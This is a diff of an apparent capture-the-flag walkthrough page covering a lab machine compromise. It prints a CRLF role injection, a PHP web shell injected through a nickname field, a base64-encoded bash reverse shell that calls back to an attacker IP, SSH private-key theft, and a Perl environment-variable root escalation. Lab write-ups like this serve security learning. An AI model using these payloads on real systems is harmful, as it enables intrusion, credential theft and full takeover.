@@ -92,90 +92,101 @@ Copy those files to our workspace
   </li>
   <li>We found some php files looking around (save.php) theres an admin role, we go to http service and register as a user.</li>
   <li>We register burp suite to check request and responses and sent a request changing the role. using CRLF vulnerability
-<br /><br />
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;role%0a<span class="o">=</span>Admin
-</code></pre></div>    </div>
-    <p><br /><br /></p>
-  </li>
+<br /><br /></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;role%0a<span class="o">=</span>Admin
+</code></pre></div></div>
+
+<p><br /><br /></p>
+<ul>
   <li>Log out and log in again</li>
   <li>We can export some results and change the extension with burp suite for excecute commands in php</li>
   <li>There’s a vulnerable parameter called nickname
-<br /><br />
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;nickname<span class="o">=</span>&lt;%3fphp+system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'CMD'</span><span class="o">])</span>+%3f&gt;<span class="o">)</span>
-</code></pre></div>    </div>
-    <p><br /><br />
-Once inside of php file we use
-<br /><br />
-```bash</p>
-  </li>
+<br /><br /></li>
 </ul>
-<file_name>.php?cmd=cat/etc/passwd
-```
-<br /><br />
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;nickname<span class="o">=</span>&lt;%3fphp+system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'CMD'</span><span class="o">])</span>+%3f&gt;<span class="o">)</span>
+</code></pre></div></div>
+
+<p><br /><br />
+Once inside of php file we use
+<br /><br /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;file_name&gt;.php?cmd<span class="o">=</span><span class="nb">cat</span>/etc/passwd
+</code></pre></div></div>
+
+<p><br /><br />
 A user called jack in the machine
 <br /><br />
 We are ready to be data
-<br /><br />
-```bash
-echo "sh -i &gt;&amp; /dev/tcp/<your_ip>/9001 0&gt;&amp;1" | base64
-```
-<br /><br />
-```bash
-echo%20%22c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ3LzkwMDEgMD4mMQo=%22%20|%20base64%20-d%20|%20bash
-```
-<br /><br />
+<br /><br /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"sh -i &gt;&amp; /dev/tcp/&lt;your_ip&gt;/9001 0&gt;&amp;1"</span> | <span class="nb">base64</span>
+</code></pre></div></div>
+
+<p><br /><br /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span>%20%22c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ3LzkwMDEgMD4mMQo<span class="o">=</span>%22%20|%20base64%20-d%20|%20bash
+</code></pre></div></div>
+
+<p><br /><br />
 Estabilize using python
-<br /><br />
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-export TERM=xterm
+<br /><br /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
 ctrl + z
-stty raw -echo; fg
-```
-<br /><br />
+<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+</code></pre></div></div>
+
+<p><br /><br />
 There is a PKI we can see it executing
-<br /><br />
-```bash
-./execute_query 5 ../.ssh/id_rsa
-```
-<br /><br />
+<br /><br /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./execute_query 5 ../.ssh/id_rsa
+</code></pre></div></div>
+
+<p><br /><br />
 This key has a problem with the format, just change the format and use
+<br /><br /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>600 id_rsa 
+<span class="nb">sudo </span>ssh <span class="nt">-i</span> id_rsa jack@10.10.11.232
+</code></pre></div></div>
+
+<p><br /><br />
+<img src="/assets/images/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c_Untitled.png" alt="Untitled" />
+<br /><br /></p>
+<h2 id="3-priv-esc">3: Priv esc</h2>
+<p><br /><br /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+
+<p><br /><br />
+<img src="/assets/images/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c_Untitled_1.png" alt="Untitled" />
 <br /><br />
-```bash
-chmod 600 id_rsa 
-sudo ssh -i id_rsa jack@10.10.11.232
-```
+<a href="http://monitor.sh">monitor.sh</a> execute a xml_pp file lets see what it is
 <br /><br />
-![Untitled](/assets/images/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c_Untitled.png)
-<br /><br />
-## 3: Priv esc
-<br /><br />
-```bash
-sudo -l
-```
-<br /><br />
-![Untitled](/assets/images/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c_Untitled_1.png)
-<br /><br />
-[monitor.sh](http://monitor.sh) execute a xml_pp file lets see what it is
-<br /><br />
-![Untitled](/assets/images/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c_Untitled_2.png)
+<img src="/assets/images/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c_Untitled_2.png" alt="Untitled" />
 <br /><br />
 This vulnerability is called as “perl_startup” Privilege Escalation.
 <br /><br />
 That enabled me to execute scripts with root privileges, as I had the ability to configure the environment while running Perl.
-<br /><br />
-```bash
-sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
-bash -p
-```
-<br /><br />
-Machine pwned!!!!
+<br /><br /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span><span class="nv">PERL5OPT</span><span class="o">=</span><span class="nt">-d</span> <span class="nv">PERL5DB</span><span class="o">=</span><span class="s1">'exec "chmod u+s /bin/bash"'</span> /opt/monitor.sh
+bash <span class="nt">-p</span>
+</code></pre></div></div>
+
+<p><br /><br />
+Machine pwned!!!!</p>
 
 <script src="/assets/js/matrix-overlay.js"></script>
 
-
 <link rel="stylesheet" href="/assets/css/imagesstyle.css" />
-</your_ip></file_name>
+
 
 </div>
 
